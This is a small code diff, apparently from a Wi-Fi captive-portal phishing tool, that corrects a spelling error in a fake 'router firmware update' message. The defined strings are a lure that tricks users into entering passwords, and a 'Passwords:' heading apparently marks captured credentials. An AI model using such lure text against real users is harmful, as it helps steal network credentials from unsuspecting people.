@@ -15,7 +15,7 @@
 #define TITLE "Update"
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
-#define POST_BODY "Your router is beeing updated. Please, wait until the proccess finishes.</br>Thank you."
+#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
 #define PASS_TITLE "Passwords:"
 
 // Init System Settings
